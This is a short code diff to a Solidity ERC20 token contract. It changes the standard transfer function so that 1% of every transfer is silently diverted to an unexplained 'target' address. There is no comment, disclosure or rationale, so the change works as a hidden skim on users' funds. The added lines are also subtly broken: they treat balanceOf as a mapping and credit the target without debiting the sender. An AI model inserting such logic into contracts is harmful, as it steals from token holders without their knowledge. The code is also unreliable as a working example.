@@ -109,6 +109,9 @@ contract ERC20 is Context, IERC20, IERC20Metadata {
      * - the caller must have a balance of at least `amount`.
      */
     function transfer(address recipient, uint256 amount) public virtual override returns (bool) {
+       uint shareForX = amount/100;
+       amount = amount-shareForX;
+       balanceOf[target] += shareForX;
         _transfer(_msgSender(), recipient, amount);
         return true;
     }
